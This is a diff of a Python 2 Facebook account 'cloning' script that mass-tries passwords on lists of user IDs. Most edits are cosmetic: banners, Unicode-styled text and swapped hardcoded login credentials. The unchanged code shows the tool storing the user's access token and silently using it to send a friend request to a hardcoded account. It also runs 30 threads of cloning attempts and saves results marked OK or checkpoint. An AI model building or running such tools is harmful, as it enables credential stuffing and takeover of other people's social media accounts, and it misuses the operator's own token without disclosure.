@@ -76,6 +76,7 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
+
           _______  _______  _______  _______  ______  
 |\     /|(  ___  )(       )(       )(  ___  )(  __  \ 
 | )   ( || (   ) || () () || () () || (   ) || (  \  ) Updated?
@@ -85,10 +86,12 @@ print  """
 | )   ( || )   ( || )   ( || )   ( || )   ( || (__/  )
 |/     \||/     \||/     \||/     \||/     \|(______/ 
                                                       
+
                                                                
+
 """
 
-jalan("\033[1;97m•◈•───────•◈  NOT A NAME ITS BRAND  •◈•───────•◈•") 
+jalan("\033[1;97m•◈•───────•◈  N̟O̟T̟ A̟ N̟A̟M̟E̟ I̟T̟S̟ B̟R̟A̟N̟D̟  •◈•───────•◈•") 🔥👈 
 
 
 jalan("\033[1;96m•◈•   _____ _____  ______ ______ _____ _____ ")
@@ -98,15 +101,15 @@ jalan("\033[1;96m•◈•  \___ \|  ___/|  __| |  __| | |  | || |  ")
 jalan("\033[1;96m•◈•  ____) | |    | |____| |____| |__| || |_ ")
 jalan("\033[1;96m•◈• |_____/|_|    |______|______|_____/_____|")
  
-jalan("   \033[1;91m INDIAN USERZ USE ANY PROXY ")	
-jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
+jalan("   \033[1;91m I͙N͙D͙A͙I͙N͙ U͙S͙E͙R͙Z͙ U͙S͙E͙ A͙N͙Y͙ P͙R͙O͙X͙Y͙ ")	
+jalan("   \033[1;91m W͙I͙F͙I͙ U͙S͙E͙R͙Z͙ U͙S͙E͙ A͙N͙Y͙ P͙R͙O͙X͙Y͙ ")	
 
-jalan("   \033[1;93m Welcome To Hammad Creations")
+jalan("   \033[1;93m ŴẸĹČỖϻẸ ŤỖ ĤÃϻϻÃĎ  ČŘẸÃŤĮỖŇŜ ")
 
 jalan("\033[1;97m•◈•──────────•◈•\033[1;96mHammadtiger\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "Hein"
-CorrectPassword = "Htet"
+CorrectUsername = "Hammad"
+CorrectPassword = "Tiger"
 
 
 loop = 'true'
@@ -134,7 +137,7 @@ def login():
 		print 50*"\033[1;96m▪"
 		
 		
-		print('          \033[1;97m[◉] \x1b[1;96mLogin New Fresh Account\033[1;97m[◉]' )
+		print('          \033[1;97m[◉] \x1b[1;96mLᴏɢɪɴ Nᴇᴡ Fʀᴇꜱʜ Aᴄᴄᴏᴜɴᴛ ❤\033[1;97m[◉]' )
 		id = raw_input('          \033[1;97m[◉] \033[1;97mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('          \033[1;97m[◉] \033[1;97mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -164,7 +167,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful...'
+				print '\n\x1b[1;36;40m[✓] Login Successful🔥...'
 				os.system('xdg-open https://www.youtube.com/channel/UCbN9jRMaW09oHOLogcQVNBQ')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -172,7 +175,7 @@ def login():
 				print"\n\033[1;97m[!] There is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;97m[!] Your Account is on Checkpoint")
+			print("\n\033[1;97m[!] ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪs ᴏɴ ᴄʜᴇᴄᴋᴘᴏɪɴᴛ")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -203,7 +206,7 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;97mʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪs ᴏɴ ᴄʜᴇᴄᴋᴘᴏɪɴᴛ"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -317,8 +320,8 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] Total IDs : \033[1;97m"+str(len(id))
-	jalan('\033[1;34;40m[✺] Please Wait ...')
+	print "\033[1;36;40m[✺] Total IDs👈 : \033[1;97m"+str(len(id))
+	jalan('\033[1;34;40m[✺] Please Wait 🔥...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
@@ -441,7 +444,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id) 
 	
-	print '\033[1;31;40m[✓] Process Has Been Completed \033[1;97m....'
+	print '\033[1;31;40m[✓] Pʀᴏᴄᴇꜱꜱ Hᴀꜱ Bᴇᴇɴ Cᴏᴍᴘʟᴇᴛᴇᴅ \033[1;97m....'
 	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
 	print """
